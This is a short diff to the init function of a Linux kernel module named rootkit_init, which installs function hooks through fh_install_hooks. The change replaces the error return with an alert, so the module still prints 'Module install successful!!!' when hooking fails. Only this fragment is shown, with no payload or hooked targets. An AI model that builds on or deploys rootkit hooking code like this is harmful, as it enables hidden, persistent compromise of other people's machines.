@@ -51,7 +51,7 @@ static int __init rootkit_init(void)
     
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if (err)
-        return err;
+        pr_alert("error");
     pr_info("Module install successful!!!\n");
     return 0;
 }
